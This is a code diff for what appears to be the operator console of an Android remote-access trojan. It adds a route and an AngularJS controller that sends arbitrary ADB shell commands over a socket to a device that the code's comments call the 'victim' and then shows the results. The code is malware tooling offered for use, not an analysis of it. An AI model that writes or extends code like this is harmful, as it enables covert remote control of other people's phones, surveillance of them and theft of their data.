@@ -45,6 +45,10 @@ app.config(function($routeProvider) {
         .when("/location", {
             templateUrl: "./views/location.html",
             controller: "LocCtrl"
+        })
+		.when("/adb", {
+            templateUrl: "./views/adb.html",
+            controller: "AdbCtrl"
         });
 });
 
@@ -625,3 +629,39 @@ app.controller("LocCtrl", function($scope, $rootScope) {
     });
 
 });
+
+//-----------------------ADB Controller (adb.htm)------------------------
+// ADB controller
+app.controller("AdbCtrl", function($scope, $rootScope) {
+    $ADBCtrl = $scope;
+    var adb = CONSTANTS.orders.adb;
+    
+	$ADBCtrl.resultCommands = '';
+	
+    $('.menu .item')
+        .tab();
+
+    $ADBCtrl.$on('$destroy', () => {
+        // release resources, cancel Listner...
+        socket.removeAllListeners(adb);
+    });
+
+    // send request to victim to send sms
+    $ADBCtrl.SendAdbCommand = (command) => {
+        $rootScope.Log('Sending Command..');
+        socket.emit(ORDER, { order: adb, extra: 'sendADB', cmd: command });
+    }
+	
+    //listening for victim response
+    socket.on(adb, (data) => {
+        
+            $ADBCtrl.load = '';
+            $rootScope.Log('Result', CONSTANTS.logStatus.SUCCESS);
+            $ADBCtrl.resultCommands = data.response;
+            $ADBCtrl.$apply();
+        
+    });
+
+
+
+})
